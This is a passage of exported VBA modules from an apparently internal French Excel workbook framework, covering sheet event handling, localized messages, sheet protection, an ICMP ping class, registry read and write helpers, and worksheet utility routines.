            .Range("IV" & 1 & ":IV" & Ligne_Fin).PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
            Application.CutCopyMode = False
        End If
            
        Set Rech = .Columns("IV").Find(what:=Niveau & Code_Simon, LookAt:=xlWhole, LookIn:=xlValues)
        If Not Rech Is Nothing Then
            If VBA.Trim(.Cells(Rech.row, Col_Langue).Value) <> vbNullString And Col_Langue <> 3 Then
                Libelle_Code_Process = VBA.Trim(.Cells(Rech.row, Col_Langue).Value)
            Else
                Libelle_Code_Process = VBA.Trim(.Cells(Rech.row, 3).Value)
            End If
        Else
            'Stop 'Non Trouv|fffd|
        End If
    End With
End Function
Attribute VB_Name = "Materiels1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Gestion des Modifications de l'onglet Materiels
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 25/09/2008
'[Version       : V1.0 du 25/09/2008
'[---------------------------------------------------------------------------
'[Sujet: Gestion des Modifications de l'onglet Materiels
'[---------------------------------------------------------------------------

Private Sub Worksheet_Change(ByVal Target As Range)
    On Error GoTo Fin
    
    Application.EnableEvents = False
    
    If Target.Count <> 1 Then GoTo Fin  'Plusieurs cellules concern|fffd|es
    If Target.row < FirstLine(shMateriels) Then GoTo Fin
    If Target.Column < 2 Then GoTo Fin
    If Target.Column > 21 Then GoTo Fin
    If ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value <> "O" Then GoTo Fin
    
    Mise_A_Jour_Date_Modification Me, Target.row
    'Controle_Format_Cellule ThisWorkbook.Worksheets(shMateriels), Target.Row, Target.Column
    Controle_Format_Ligne ThisWorkbook.Worksheets(shMateriels), Target.row

Fin:
    Application.EnableEvents = True
    On Error GoTo 0
End Sub
Attribute VB_Name = "MessagesClass"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'[---------------------------------------------------------------------------
'[Identifiant   : FrameWork Poste de Travail
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 22/03/2006
'[Version       : V1.2 du 21/09/2007
'[---------------------------------------------------------------------------
'[Sujet: Classe d'affichage des Messages d'alertes et de d|fffd|fauts
'[---------------------------------------------------------------------------

Option Explicit


'Sub qui affiche un message lorsqu'une erreur est intercept|fffd|e avec recup des textes dans le fichier ini langage
Function ShowMessage(Msg1 As String, Param1 As String, Msg2 As String, Param2 As String, vbConst, Optional Title As String = APP_TITLE) As Long
    Dim msgText               As String
    If Msg1 <> vbNullString Then
        'Obtention du texte de ce message
        msgText = IniCls.ReadStringIniLangage("MsgFWK", Msg1) & " " & Param1
    End If
    
    If Msg2 <> vbNullString Then
        msgText = msgText & " " & IniCls.ReadStringIniLangage("MsgFWK", Msg2) & " " & Param2
    End If
    
    If Title <> APP_TITLE Then
        Title = IniCls.ReadStringIniLangage("MsgFWK", Title)
    End If
    
    If msgText <> vbNullString Then
        Beep
        ShowMessage = MsgBox(msgText, vbConst, Title)
    End If
End Function


Function GetInputBox(ByRef Saisie As Variant, Msg As String, data As Integer, Optional Title As String = APP_TITLE) As Boolean
    'Data : 0=Une formule, 1=Un nombre, 2=Texte, 4=valeur logique, 8=r|fffd|f|fffd|rence de cellule,16=valeur d'erreur,64=tableau de valeurs.
    Dim msgText               As String
    If Msg <> vbNullString Then
        'Obtention du texte de ce message
        msgText = IniCls.ReadStringIniLangage("MsgFWK", Msg)
    End If
  
    Do
        If data = 1 Then
            Saisie = Application.InputBox(Default:=Saisie, prompt:=msgText, Title:=Title, Type:=data)
        Else
            If IsEmpty(Saisie) Then Saisie = vbNullString
            Saisie = Application.InputBox(Default:=Saisie, prompt:=msgText, Title:=Title)
            If TypeName(Saisie) = "String" Then Saisie = VBA.Trim(Saisie)
        End If
        If (Saisie = False) Or (Saisie = "Faux") Then
            GetInputBox = False
            Exit Function ' Bouton Annuler
        Else
            GetInputBox = True
        End If
    Loop Until Saisie <> vbNullString
End Function


'Affichage dans la statusBarre
Sub WriteInStatusBar(Msg As String, Show As Boolean)
    If Msg <> vbNullString Then
        'Obtention du texte de ce message
        Msg = IniCls.ReadStringIniLangage("MsgFWK", Msg)
    End If
    Application.StatusBar = Msg
    Application.DisplayStatusBar = Show
End Sub


Attribute VB_Name = "P_Protection"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Protection des Interfaces du TDI
'[Auteur        : Alain CHERMAT
'[Service       : SIMPM - Sce 65931
'[Date cr|fffd|ation : 15/12/2009
'[Version       : V1.0 du 15/12/2009
'[---------------------------------------------------------------------------
'[Sujet: Protection des Interfaces du TDI
'[---------------------------------------------------------------------------


Sub Protection_Interfaces()
    Protection shCde_Bienvenue
    Protection shCde_Nomenclature
    Protection shCde_Simon
    Protection shCde_Document
End Sub


Sub Protection(Sht As String)
    'expression.Protect(Password, DrawingObjects, Contents, Scenarios, UserInterfaceOnly, AllowFormattingCells,
                    'AllowFormattingColumns, AllowFormattingRows, AllowInsertingColumns, AllowInsertingRows,
                    'AllowInsertingHyperlinks, AllowDeletingColumns, AllowDeletingRows, AllowSorting, AllowFiltering,
                    'AllowUsingPivotTables)
    On Error Resume Next
    DeProtection Sht
    With ThisWorkbook.Worksheets(Sht)
        Select Case Sht
            Case shCde_Bienvenue
            
            Case shCde_Nomenclature
                .Protection.AllowEditRanges.Add Title:="Plage1", Range:=.Range("C20")
            Case shCde_Simon
                .Protection.AllowEditRanges.Add Title:="Plage1", Range:=.Range("P22")
                .Protection.AllowEditRanges.Add Title:="Plage2", Range:=.Range("H31")
            Case shCde_Document
                .Protection.AllowEditRanges.Add Title:="Plage1", Range:=.Range("C26")
                .Protection.AllowEditRanges.Add Title:="Plage2", Range:=.Range("H26")
        End Select
    End With
    
    ThisWorkbook.Worksheets(Sht).Protect Password:=CryptCls.Decode(PwDev), UserInterfaceOnly:=True, DrawingObjects:=True
    On Error GoTo 0
End Sub


Sub DeProtection(Sht As String)
    ThisWorkbook.Worksheets(Sht).Unprotect Password:=CryptCls.Decode(PwDev)
End Sub
Attribute VB_Name = "PageAccueil"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Option Explicit


Private Sub Worksheet_Activate()

    Dim i, Pos As Integer
    Dim Liste, Valeur As Variant
    Dim trouve As Boolean
    Liste = Array(shCde_Bienvenue, ShAffaire, shDecoupage, shMateriels, shDocuments, shPieces_Rechange, shTable_Fonction_Process)
    On Error Resume Next ' Erreur si l'onglet est d|fffd|j|fffd| masqu|fffd|
    ' Pour tous les onglets |fffd| masquer, on passe la propri|fffd|t|fffd| |fffd| false
    'Application.ScreenUpdating = False
    For i = 1 To ThisWorkbook.Sheets.Count
        trouve = False
        For Each Valeur In Liste
            Pos = VBA.InStr(ThisWorkbook.Sheets(i).Name, Valeur)
            If Pos > 0 Then
                trouve = True
                Exit For
            End If
        Next
        If trouve Then
            ThisWorkbook.Sheets(i).Visible = True
        Else
            ThisWorkbook.Sheets(i).Visible = False
        End If
    Next
    ThisWorkbook.Sheets(shCde_Bienvenue).Select
    'Application.ScreenUpdating = True
End Sub


Function Authentification()
    Dim frmLogin    As New frmLogin
    
    With frmLogin
        .Show
    End With
End Function


'Affichage de la page d'accueil de l'application
Public Sub ShowWelcome(user As Boolean, Optional Maximized As Boolean = False)

End Sub


'Construction et Affichage du menu principal
Sub ShowMainMenu(menuFichiersEnabled As Boolean, menuDocumentsEnabled As Boolean)

End Sub
Attribute VB_Name = "PingClass"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'[---------------------------------------------------------------------------
'[Identifiant   : FrameWork Poste de Travail
'[Auteur        : Alain CHERMAT
'[Service       : DTSI - RS|fffd| - RS|fffd| Minute - Sce 50517
'[Date cr|fffd|ation : 22/03/2006
'[Version       : V1.1 du 19/04/2007
'[---------------------------------------------------------------------------
'[Sujet: Classe Ping une machine
'[---------------------------------------------------------------------------

Option Explicit

Private Const SOCKET_ERROR = 0

'**********************************
'D|fffd|claration des types de donn|fffd|es *
'**********************************
Private Type WSAdata
    wVersion As Integer
    wHighVersion As Integer
    szDescription(0 To 255) As Byte
    szSystemStatus(0 To 128) As Byte
    iMaxSockets As Integer
    iMaxUdpDg As Integer
    lpVendorInfo As Long
End Type

Private Type Hostent
    h_name As Long
    h_aliases As Long
    h_addrtype As Integer
    h_length As Integer
    h_addr_list As Long
End Type

Private Type IP_OPTION_INFORMATION
    TTL As Byte
    Tos As Byte
    Flags As Byte
    OptionsSize As Long
    OptionsData As String * 128
End Type

Private Type IP_ECHO_REPLY
    Address(0 To 3) As Byte
    Status As Long
    RoundTripTime As Long
    DataSize As Integer
    Reserved As Integer
    data As Long
    Options As IP_OPTION_INFORMATION
End Type

'***************************
'D|fffd|claration des fonctions *
'***************************
Private Declare Function GetHostByName Lib "wsock32.dll" Alias "gethostbyname" (ByVal HostName As String) As Long
Private Declare Function WSAStartup Lib "wsock32.dll" (ByVal wVersionRequired&, lpWSAdata As WSAdata) As Long
Private Declare Function WSACleanup Lib "wsock32.dll" () As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (hpvDest As Any, hpvSource As Any, ByVal cbCopy As Long)
Private Declare Function IcmpCreateFile Lib "icmp.dll" () As Long
Private Declare Function IcmpCloseHandle Lib "icmp.dll" (ByVal handle As Long) As Boolean
Private Declare Function IcmpSendEcho Lib "ICMP" (ByVal IcmpHandle As Long, ByVal DestAddress As Long, ByVal RequestData As String, ByVal RequestSize As Integer, RequestOptns As IP_OPTION_INFORMATION, ReplyBuffer As IP_ECHO_REPLY, ByVal ReplySize As Long, ByVal TimeOut As Long) As Boolean

'*****************************************
'Fait un ping au site pass|fffd| en param|fffd|tre *
'*****************************************
Public Function Ping(sAddr As String, Optional TimeOut As Integer = 2000) As Long
    Dim hFile As Long, lpWSAdata As WSAdata
    Dim hHostent As Hostent, AddrList As Long
    Dim Address As Long, rIP As String
    Dim OptInfo As IP_OPTION_INFORMATION
    Dim EchoReply As IP_ECHO_REPLY
    
    Call WSAStartup(&H101, lpWSAdata)
    
    If GetHostByName(sAddr + VBA.String(64 - VBA.Len(sAddr), 0)) <> SOCKET_ERROR Then
        CopyMemory hHostent.h_name, ByVal GetHostByName(sAddr + VBA.String(64 - VBA.Len(sAddr), 0)), Len(hHostent)
        CopyMemory AddrList, ByVal hHostent.h_addr_list, 4
        CopyMemory Address, ByVal AddrList, 4
    End If
    
    hFile = IcmpCreateFile()
    
    If hFile = 0 Then
        Ping = -2 ' MsgBox "Unable to Create File Handle"
        Exit Function
    End If
    
    OptInfo.TTL = 255
    
    If IcmpSendEcho(hFile, Address, VBA.String(32, "A"), 32, OptInfo, EchoReply, Len(EchoReply) + 8, TimeOut) Then
        rIP = CStr(EchoReply.Address(0)) + "." + CStr(EchoReply.Address(1)) + "." + CStr(EchoReply.Address(2)) + "." + CStr(EchoReply.Address(3))
    Else
        Ping = -1 ' MsgBox "Timeout"
    End If
    
    If EchoReply.Status = 0 Then
        Ping = EchoReply.RoundTripTime
    Else
        Ping = -3
    End If
    
    IcmpCloseHandle hFile
    WSACleanup

End Function


Sub test()
    Dim Result As Integer
    
    Result = Ping("corp.noxiane.net")
    
    If Result < 0 Then
        MsgBox "Ping failed, error: " & Result
    Else
        MsgBox "Ping ok, R|fffd|sultat: " & Result
    End If
End Sub
Attribute VB_Name = "RegistryClass"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'[---------------------------------------------------------------------------
'[Identifiant   : FrameWork Poste de Travail
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 22/03/2006
'[Version       : V1.1 du 19/04/2007
'[---------------------------------------------------------------------------
'[Sujet: Classe d'acces |fffd| la Base de Registre
'[---------------------------------------------------------------------------

Option Explicit

Private Lng As Long

'Constantes correspondant aux cinq cl|fffd|s de la base de registres
Const HKEY_CLASSES_ROOT = &H80000000
Const HKEY_CURRENT_USER = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002
Const HKEY_USERS = &H80000003
Const HKEY_DYN_DATA = &H80000004

Const KEY_ALL_ACCESS = &H3F
Const ERROR_SUCCESS = 0
Const REG_SZ = 1 ' valeur cha|fffd|ne

Public Enum HCle
    HKeyLocalMachine = 0
    HKeyCurrentUser = 1
    HKeyClassesRoot = 2
    HKeyUsers = 3
    HKeyDynamicData = 4
End Enum

'API n|fffd|cessaires

'Api de manipulation de la base de registre
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long

'pour cr|fffd|er ou ouvrir une cl|fffd|
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
     
'pour supprimer une cl|fffd|
Private Declare Function RegDeleteKey Lib "advapi32.dll" Alias "RegDeleteKeyA" (ByVal hKey As Long, ByVal lpSubKey As String) As Long
     
'pour supprimer une valeur
Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpSubKey As String) As Long
     
'pour lire une valeur
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
     
'pour fixer ou cr|fffd|er une valeur
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" _
    (ByVal hKey As Long, _
     ByVal lpValueName As String, _
     ByVal Reserved As Long, _
     ByVal dwType As Long, _
     ByVal lpData As Any, _
     ByVal cbData As Long) As Long


Public Function CreerCle(HK As HCle, Chemin As String) As Long
    RegCreateKey HKConvert(HK), Chemin, Lng
    CreerCle = Lng
End Function


Private Function HKConvert(HK As HCle) As Long
    If HK = 2 Then HKConvert = HKEY_CLASSES_ROOT
    If HK = 1 Then HKConvert = HKEY_CURRENT_USER
    If HK = 0 Then HKConvert = HKEY_LOCAL_MACHINE
    If HK = 3 Then HKConvert = HKEY_USERS
    If HK = 4 Then HKConvert = HKEY_DYN_DATA
End Function


Public Function SupprCle(HK As HCle, Chemin As String)
    RegDeleteKey HKConvert(HK), Chemin
End Function


Public Function DonnerValeur(HK As HCle, Chemin As String, Valeur As String, Donnee As String)
    RegCreateKey HKConvert(HK), Chemin, Lng
    RegSetValueEx Lng, Valeur, 0&, 1, Donnee, VBA.Len(Donnee) + 1
End Function


'Pour lire une valeur dans la base
Public Function Lit_Valeur(Clef As Long, sousClef As String, Valeur As String) As String
    Dim resultat     As Long
    Dim Ident        As Long
    Dim TailleBuffer As Long
    Dim Donnee       As String

    On Error Resume Next
    Lit_Valeur = vbNullString
    TailleBuffer = 255
    Donnee = VBA.String(TailleBuffer, " ")
    resultat = RegOpenKeyEx(Clef, sousClef, 0, KEY_ALL_ACCESS, Ident)
    If resultat = ERROR_SUCCESS Then
         resultat = RegQueryValueEx(Ident, Valeur, 0&, REG_SZ, ByVal Donnee, TailleBuffer)
         Lit_Valeur = VBA.Left(Donnee, TailleBuffer - 1)
    End If
    resultat = RegCloseKey(Ident)
    On Error GoTo 0
End Function


'=============================================================================================================
'=================================================== Code Non Valid|fffd| =========================================
'=============================================================================================================

'Public Function LireValeur(HK As HCle, Chemin As String, Valeur As String) As String
'On Error GoTo erreur
'Buff = 0
'Buff = RegCreateKey(HKConvert(HK), Chemin, lng)
'If Buff = 0 Then RegQueryValueEx lng, Valeur, 0&, 1, 0&, Buff
'If Buff < 2 Then
'    LireValeur = vbnullstring
'    Exit Function
'End If
'LireValeur = String(Buff + 1, " ")
'RegQueryValueEx lng, Valeur, 0&, 1, ByVal LireValeur, Buff
'LireValeur = vba.left(LireValeur, Buff - 1)
''mettre a la place de form1.tag l'emplacement o|fffd| vous voulez |fffd|crire la valeur de la cl|fffd| lu
'form1.Tag = LireValeur
'Exit Function
'erreur:
'    MsgBox "Configuration du port incorrect, impossible de lancer l'acquisition"
'End Function
'
'Public Function SupprValeur(HK As HCle, Chemin As String, Valeur As String)
'Buff = 0
'Buff = RegCreateKey(HKConvert(HK), Chemin, lng)
'If Buff = 0 Then RegDeleteValue lng, ByVal Valeur
'End Function


'Public Sub Run(Parametre As String)
'    DonnerValeur type cl|fffd|, "adresse cl|fffd|", "nom cl|fffd|", App.Path & "\" & App.EXEName & ".exe " & Parametre
'End Sub
'
'Public Function IsRun() As Boolean
'    If LireValeur(type cl|fffd|, "adresse cl|fffd|", "nom cl|fffd|") <> vbnullstring Then IsRun = True Else IsRun = False
'End Function
'
'Public Sub DelRun()
'    SupprValeur Type cl|fffd|, "adresse", "nom cl|fffd|"
'End Sub
Attribute VB_Name = "SheetClass"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'[---------------------------------------------------------------------------
'[Identifiant   : FrameWork Poste de Travail
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 22/03/2006
'[Version       : V1.6 du 29/07/2009
'[---------------------------------------------------------------------------
'[Sujet: Classe Biblioth|fffd|que de fonctions de feuilles
'[---------------------------------------------------------------------------

Option Explicit


Sub Mise_EnForme_Extraction(Optional BaseCell As Range = Nothing)
    With BaseCell.parent
        .Activate
        On Error Resume Next
        .Names("Source_Data").Delete
        On Error GoTo 0
        .parent.Names.Add Name:="Source_Data", RefersTo:="='" & .Name & "'!" & BaseCell.CurrentRegion.Address
        
        'Mise En Forme des Donn|fffd|es
        With .Rows(BaseCell.row)
            .Font.Name = "Arial"
            .Font.Bold = True
            .Font.Italic = True
            .Font.ColorIndex = 32
            .Font.Size = 10
            .HorizontalAlignment = xlCenter
            .VerticalAlignment = xlCenter
            .WrapText = True
        End With
                
        BaseCell.CurrentRegion.EntireColumn.AutoFit
        
        If Not .AutoFilterMode Then .Rows(BaseCell.row).AutoFilter 'pose le Filtre Automatique
        ActiveWindow.SplitRow = BaseCell.row
        ActiveWindow.FreezePanes = True
        BaseCell.Select
    End With
End Sub


'Test l'existence d'une feuille dans le classeur sp|fffd|cifi|fffd|
Function Sheet_Exist(wB As Workbook, NomFeuille As Variant) As Boolean
  Dim wS As Object
  Sheet_Exist = False
  For Each wS In Workbooks(wB.Name).Sheets
    If VBA.UCase(wS.Name) = VBA.UCase(NomFeuille) Then
        Sheet_Exist = True
        Exit For
    End If
  Next
End Function


'Trier les onglets d'un classeur
Sub TriNomsOnglets(wB As Workbook)
    Dim i As Integer
    Dim j As Integer
    
    For i = 1 To wB.Sheets.Count
        'wb.Sheets(I).Visible = True
        
        For j = 1 To i - 1
            If VBA.UCase(wB.Sheets(i).Name) < VBA.UCase(wB.Sheets(j).Name) Then
                wB.Sheets(i).Move Before:=wB.Sheets(j)
                Exit For
            End If
        Next j
    Next i
End Sub


'Test l'existence d'une plage nomm|fffd|e dans une feuille
Function Zone_Nommee_Existe(wS As Worksheet, Rech As String) As Boolean
    Dim Zone As Object
    Zone_Nommee_Existe = False
    On Error GoTo erreur
    Set Zone = wS.Range(Rech)
    Zone_Nommee_Existe = True
erreur:
    On Error GoTo 0
End Function


Sub FindLastCell(wS As Worksheet)
    Dim LastColumn As Integer
    Dim LastRow As Long
    
    If WorksheetFunction.CountA(wS.Cells) > 0 Then
        wS.Activate
        'Ws.range("A4").Select
        '.range(.[A1] range("A1") '[A1]
        'Search for any entry, by searching backwards by Rows.
        LastRow = wS.Cells.Find(what:="*", after:=wS.Range("A1"), SearchOrder:=xlByRows, SearchDirection:=xlPrevious).row
        'Search for any entry, by searching backwards by Columns.
        LastColumn = wS.Cells.Find(what:="*", after:=wS.Range("A1"), SearchOrder:=xlByColumns, SearchDirection:=xlPrevious).Column
        
        MsgBox wS.Cells(LastRow, LastColumn).Address
    End If
End Sub


'Fonction convertissant le Num|fffd|ro de colonne en lettre(s)
Function AlphaColumn(numColon As Byte) As String
    Dim x       As Integer
    Dim z       As Integer
    Dim Caract  As String
    x = Int((numColon - 1) / 26)
    z = numColon - (x * 26)
    If x > 0 Then Caract = VBA.Chr(64 + x)
    AlphaColumn = Caract & VBA.Chr(64 + z)
End Function


'Recherche derni|fffd|re colonne vers la gauche
Function LastLeftColumn(wS As Worksheet, numLine As Long) As Byte
    LastLeftColumn = wS.Cells(numLine, wS.Columns.Count).End(xlToLeft).Column
End Function


'Recherche derniere ligne vers le haut
Function LastLineColumn(wS As Worksheet, numColumn As Integer) As Long
    LastLineColumn = wS.Cells(wS.Rows.Count, numColumn).End(xlUp).row
End Function


'Recherche derniere ligne vers le haut
Function LastLineZoneColumns(wS As Worksheet, numFirstColumn As Byte, numLastColumn As Byte) As Long
    Dim numColumn   As Byte
    Dim numLine     As Long
    
    'Boucle
    For numColumn = numFirstColumn To numLastColumn
        numLine = wS.Cells(wS.Rows.Count, numColumn).End(xlUp).row
        If numLine > LastLineZoneColumns Then LastLineZoneColumns = numLine
    Next
End Function


Function Conversion_Texte_Nombre(Plage As Range)
    Dim C As Range
    On Error Resume Next
    For Each C In Plage 'essayer Plage.Cells
        If C.Value <> vbNullString Then C.Value = C.Value * 1
    Next C
    On Error GoTo 0
End Function

'Compte le Nombre de cellules Non Vide
Function NombreCellulesNonVide(Rng As Range) As Double
    Dim Compteur As Double
    Dim C As Range
    Compteur = 0
    For Each C In Rng
        If C.Value <> vbNullString Then Compteur = Compteur + 1
    Next

    NombreCellulesNonVide = Compteur
End Function


'Function retournant le nombre de feuilles pr|fffd|sentes dans un classeur
Function NbSheetsInBook(nameBook As String)
    NbSheetsInBook = Workbooks(nameBook).Sheets.Count
End Function


'Sub affichant la page active
Sub ShowActiveSheet(wihtStop As Boolean)
    If wihtStop Then End
End Sub


'Supprimer tous les noms (avec un joker) dans une feuille de calcul.
Sub SupprimeNomsAvecJoker(Nom As String, wS As Worksheet)
    Dim Nm As Name
    For Each Nm In wS.Names
        If Nm.Name Like Nom Then
            Nm.Delete
        End If
    Next
End Sub


Sub Suppression_Double_Blancs(wS As Worksheet)
    Dim Rech As Object
    Do  'Virer les Doubles Blancs
        Set Rech = wS.Cells.Find(what:="  ", LookAt:=xlPart)
        If Not Rech Is Nothing Then
            wS.Cells.Replace what:="  ", Replacement:=" ", LookAt:=xlPart, _
                SearchOrder:=xlByColumns, MatchCase:=False, SearchFormat:=True, ReplaceFormat:=True
        End If
    Loop Until Rech Is Nothing
End Sub


Function Nombre_Lignes_Visibles(wS As Worksheet) As Long
    Nombre_Lignes_Visibles = wS.Range("A1:A" & wS.Range("A" & wS.Rows.Count).End(xlUp).row).SpecialCells(xlVisible).Count

    'MsgBox ws.AutoFilter.Range.Columns(1).SpecialCells(xlCellTypeVisible).Cells.Count
    'MsgBox Evaluate("=subtotal(3,A:A)")
End Function
 


'======================================================================================================
'============================================ Code Non valid|fffd| =========================================
'======================================================================================================

'Ne pas d|fffd|ployer dans une application Internationale sans le Jeu de caract|fffd|res Fran|fffd|ais
Function Caracteres_Speciaux(wS As Worksheet)
    With wS.Cells
        .Replace what:="|fffd|", Replacement:="|fffd|", LookAt:=xlPart, SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, ReplaceFormat:=False
        .Replace what:="{", Replacement:="|fffd|", LookAt:=xlPart, SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, ReplaceFormat:=False
        .Replace what:="|fffd|", Replacement:="|fffd|", LookAt:=xlPart, SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, ReplaceFormat:=False
        .Replace what:="|fffd|", Replacement:="|fffd|", LookAt:=xlPart, SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, ReplaceFormat:=False
        .Replace what:="}", Replacement:="|fffd|", LookAt:=xlPart, SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, ReplaceFormat:=False
    End With
End Function


'par d|fffd|faut la fonction se contente de remplacer les accents courrants.
'avec les arguments optionnels, tout type de caract|fffd|re peut |fffd|tre remplac|fffd| par tout autre, ou bien par rien du tout.
'Exemple d 'utilisation:
'maVar = StripSpecialChars(maVar)
'utilisation respectant les majuscules
'maVar = StripSpecialChars(maVar, vbBinaryCompare)
'ou
'maVar = StripSpecialChars(maVar, , "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "aaaeeeeiiioouuucAAAEEEEIIIOOUUUC")
'supprimer des caract|fffd|res sp|fffd|ciaux
'maVar = StripSpecialChars(maVar, , "&#{}[]()-|_@|fffd|=+*%!?,.;/:'vbnullstring", vbnullstring)

'Public Function StripSpecialChars(iString As String, Optional _
'                CompareMethod As VbCompareMethod = vbTextCompare, Optional Lookup As String _
'                = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Optional ReplaceBy As String = "aaaeeeeiuc") As String
'    Dim i As Long
'
'    ' dans le doute on remplace pas on supprime le caract|fffd|re
'    If vba.len(ReplaceBy) < vba.len(Lookup) Then ReplaceBy = vbnullstring
'    For i = 1 To vba.len(Lookup)
'        ' on remplace tous les caract|fffd|res de Lookup 1 par 1 dans iString
'        iString = Replace(iString, vba.mid(Lookup, i, 1), (IIf(ReplaceBy = vbnullstring, vbnullstring, _
'            vba.mid(ReplaceBy, i, 1))), , , CompareMethod)
'    Next i
'    StripSpecialChars = iString
'End Function


'a restaurer
'Sub donnant le num|fffd|ro de colonne |fffd| partir du nom de son champ
'Sub NumColonchamp(Ws As Worksheet, nomClasseur As String, nomChamp As String, numColon As Integer)
    'On Error Resume Next
        'numColon = Ws.Range(nomChamp).Column
        'If Err > 0 Then
            'MessagesErreur 34, 3, 7, 8, 31, 0, Ws.Name, nomClasseur, nomChamp, vbnullstring, vbOKOnly, vbCritical
            'AfficheAccueilStop
        'End If
    'On Error GoTo 0
'End Sub


'Comparer deux colonnes.
'  permet d 'ajouter dans la colonne 1 les valeurs qui seraient dans la colonne 2 et pas dans la colonne 1.
Sub CompareTwoColonnes()
Dim cell As Range, Plage As Range, i As Long
Set Plage = Range("A1", Range("A1").End(xlDown))
i = Plage.Count
Application.ScreenUpdating = False
For Each cell In Range("B1", Range("B1").End(xlDown))
      If Plage.Find(cell, Plage(1), xlValues, xlWhole) Is Nothing Then
            i = i + 1
            Cells(i, 1) = cell
      End If
Next cell
End Sub
 

'Effectuer un calcul sur une plage.
'  Permet de multiplier l'ensemble d'une plage par une valeur (2 dans l'exemple)
Sub MultiplieParDeux()
' Utilisation d'un tableau interm|fffd|diaire
Dim Tabl
Dim i As Integer, j As Integer
Tabl = Range("A1:C1000").Value
      For i = 1 To 1000
            For j = 1 To 3
                  Tabl(i, j) = Tabl(i, j) * 2
            Next j
      Next i
Application.ScreenUpdating = False
Range("A1:C1000").Value = Tabl
End Sub
 

'permet d'effectuer une recopie incr|fffd|ment|fffd|e
Sub RecopieIncrementee(PlageSource As Excel.Range, PlageDestination As Excel.Range)
    PlageSource.AutoFill Destination:=PlageDestination
End Sub

 
'Ins|fffd|rer une ligne vide toutes les 2 lignes (ou plus...).
'  permet d 'ins|fffd|rer dans un tableau une ligne vide toutes les deux lignes (ou plus)
Sub MacroInsertUneLigneSurDeux()
Dim Line As Integer
Range("A2").Select
Line = 1
Recommence:
Line = Line + 2
Rows(Line).Select
Selection.Insert Shift:=xlDown
If Line < ActiveSheet.UsedRange.Rows.Count Then
      GoTo Recommence
End If
End Sub

 
'Introduire une variable dans une formule SOMME.
'(Ex. Un N|fffd| de ligne)
  Sub VariableSomme()
  Dim MonNoDeLigne As Long
' La colonne A est la colonne o|fffd| l'on doit effectuer une somme
' Se placer sur la premi|fffd|re ligne vide de la colonne pour poser la formule Somme
Range("A1").End(xlDown).Offset(1, 0).Select
' R|fffd|cup|fffd|ration du nombre de lignes |fffd| comptabiliser dans la formule
MonNoDeLigne = -(ActiveCell.row) + 1
ActiveCell.FormulaR1C1 = "=SUM(R[" & MonNoDeLigne & "]C:R[-1]C)"
End Sub

 
'Introduire une variable dans une formule SOMME.
'(Ex. L'adresse d'une cellule)
  Sub VariableAdressDansSomme()
Range("A1").End(xlDown).Offset(1, 0).Value = "=SUM(A1:" & Range("A1").End _
(xlDown).Address & ")"
End Sub


